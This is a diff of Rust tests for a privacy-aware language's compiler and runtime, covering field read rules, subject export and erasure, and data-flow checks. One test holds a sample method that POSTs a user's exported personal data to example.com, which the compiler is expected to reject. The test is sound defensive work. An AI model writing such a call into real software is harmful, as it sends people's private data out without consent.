@@ -2601,7 +2601,7 @@ fn lists_of_several_peoples_entries_are_declared_where_they_can_be_checked() {
 const BOOKING: &str = r#"@server @read("anyone") object Slot {
   title: string = "Cut"
   @read("staff", "self") customer: string = ""
-  @read("staff") alarm: number = 0
+  @read("none") alarm: number = 0
   @allow("signedIn") book() { this.customer = caller.id; this.alarm = 7 }
 }
 @server @read("owner", "staff") object Customer {
@@ -2614,19 +2614,22 @@ const BOOKING: &str = r#"@server @read("anyone") object Slot {
 #[test]
 fn each_field_is_seen_by_the_readers_its_own_rule_names() {
     let mut rt = server(BOOKING, false);
-    call_as(&mut rt, 1.0, "Slot/s1", "book", json!([]), who("user:ana", &[])).unwrap();
-    call_as(&mut rt, 1.0, "Customer/user:ana", "save", json!(["Ana"]), who("user:ana", &[])).unwrap();
     let mut n = 0;
     let mut get = |rt: &mut Runtime, object: &str, caller: Option<Caller>| {
         n += 1;
         let out = rt.handle(2.0, Input::Get { object: object.into(), reply: Some(n), caller });
         out.into_iter().find_map(|o| if let Output::Reply { ok, .. } = o { ok } else { None }).unwrap()
     };
-    // The public slot: who booked it is staff's and that person's to see; the alarm, staff's.
-    assert_eq!(get(&mut rt, "Slot/s1", who("", &[])), json!({ "title": "Cut", "customer": "", "alarm": 0 }), "hidden fields show their defaults");
+    // Open slot: "self" field is "" for everyone so it shows as open.
     assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[])), json!({ "title": "Cut", "customer": "", "alarm": 0 }));
+    call_as(&mut rt, 1.0, "Slot/s1", "book", json!([]), who("user:ana", &[])).unwrap();
+    call_as(&mut rt, 1.0, "Customer/user:ana", "save", json!(["Ana"]), who("user:ana", &[])).unwrap();
+    // Booked slot: others see "•••" (booked, without identity); staff and ana see "user:ana".
+    // @read("none") stays at its default even for staff, while tools still see it.
+    assert_eq!(get(&mut rt, "Slot/s1", who("", &[])), json!({ "title": "Cut", "customer": "•••", "alarm": 0 }));
+    assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[])), json!({ "title": "Cut", "customer": "•••", "alarm": 0 }));
     assert_eq!(get(&mut rt, "Slot/s1", who("user:ana", &[])), json!({ "title": "Cut", "customer": "user:ana", "alarm": 0 }));
-    assert_eq!(get(&mut rt, "Slot/s1", who("key:sam", &["staff"])), json!({ "title": "Cut", "customer": "user:ana", "alarm": 7 }));
+    assert_eq!(get(&mut rt, "Slot/s1", who("key:sam", &["staff"])), json!({ "title": "Cut", "customer": "user:ana", "alarm": 0 }));
     // Staff see the customer's current name, as the field's rule says, and not the rest.
     assert_eq!(get(&mut rt, "Customer/user:ana", who("key:sam", &["staff"])), json!({ "name": "Ana", "note": "•••" }));
     assert_eq!(get(&mut rt, "Customer/user:ana", who("user:ana", &[])), json!({ "name": "Ana", "note": "Ana" }));
@@ -2634,11 +2637,12 @@ fn each_field_is_seen_by_the_readers_its_own_rule_names() {
     assert_eq!(get(&mut rt, "Customer/user:ana", Some(Caller::trusted())), json!({ "name": "•••", "note": "•••" }));
     assert_eq!(get(&mut rt, "Slot/s1", Some(Caller::trusted()))["alarm"], json!(7));
 
-    // A field naming a person is theirs to export and erase.
+    // A field naming a person is theirs to export and erase; erasing reopens the slot for everyone.
     assert_eq!(rt.export_subject("user:ana").unwrap()["Slot/s1#customer"], json!("user:ana"));
     let e = rt.erase_subject("user:ana", None).unwrap();
     assert!(e.erased.contains(&"Slot/s1#customer".to_string()), "{:?}", e.erased);
     assert_eq!(get(&mut rt, "Slot/s1", who("key:sam", &["staff"]))["customer"], json!(""));
+    assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[]))["customer"], json!(""));
 }
 
 #[test]
@@ -2678,6 +2682,64 @@ fn a_fields_rule_is_checked_where_it_is_written() {
   @read(\"staff\") @read(\"staff\") c: string = \"\"
 }
 ").contains("unknown or repeated field decorator @read"));
+    assert!(msg("@server @read(\"none\") object S {
+  c: string = \"\"
+}
+").contains("\"none\" is for a field's @read"));
+    assert!(msg("@server @read(\"anyone\") object S {
+  @read(\"none\", \"staff\") c: string = \"\"
+}
+").contains("\"none\" cannot be combined"));
+}
+
+#[test]
+fn device_screen_may_display_own_export_without_reveal_but_cannot_leak_it() {
+    let base = r#"import { exportData } from "tj:privacy"
+@server @read("owner") object Account {
+  @pii("contact", "booking") name: string = ""
+  @pii("financial", "billing") card: string = ""
+  @allow("owner") async mine(): any { return await exportData(caller.id) }
+}
+"#;
+    // Showing the signed-in person their own multi-purpose export in a device-local screen object
+    // compiles without reveal, and records zero reveals.
+    let ok = format!(
+        "{base}object Screen {{
+  myData: string = \"\"
+  async load() {{ this.myData = JSON.stringify(await Account.get(caller.id).mine(), null, 2) }}
+}}
+function App() {{
+  const s = Screen.get(\"main\")
+  return <Column><Button onPress={{() => s.load()}}>Show</Button><Text>{{s.myData}}</Text></Column>
+}}
+"
+    );
+    assert!(compile(&ok).is_ok(), "{:?}", compile(&ok).err());
+    assert!(tj_core::facts(&ok).reveals.is_empty());
+
+    // Sending that device-local field to fetch is still caught by the flow check!
+    let leak = format!(
+        "{base}object Screen {{
+  myData: string = \"\"
+  async load() {{ this.myData = JSON.stringify(await Account.get(caller.id).mine(), null, 2) }}
+  async leak() {{ await fetch(\"https://example.com\", {{ method: \"POST\", body: this.myData }}) }}
+}}
+"
+    );
+    let err = compile(&leak).err().expect("leak should be refused");
+    assert!(err.iter().any(|d| d.message.contains("reaches `fetch`")), "{err:?}");
+
+    // Someone else's data still cannot be stored on a device-local object without reveal,
+    // and the hint does not tell you to add @pii to a device object.
+    let other = format!(
+        "{base}object Screen {{
+  copy: string = \"\"
+  grab(id: string) {{ this.copy = Account.get(id).name }}
+}}
+"
+    );
+    let err = compile(&other).err().expect("other person's data should be refused");
+    assert!(err.iter().any(|d| d.message.contains("reaches `this.copy`") && !d.hint.as_deref().unwrap_or("").contains("@pii")), "{err:?}");
 }
 
 const SHELF: &str = r#"@server @read("anyone") object Slot {
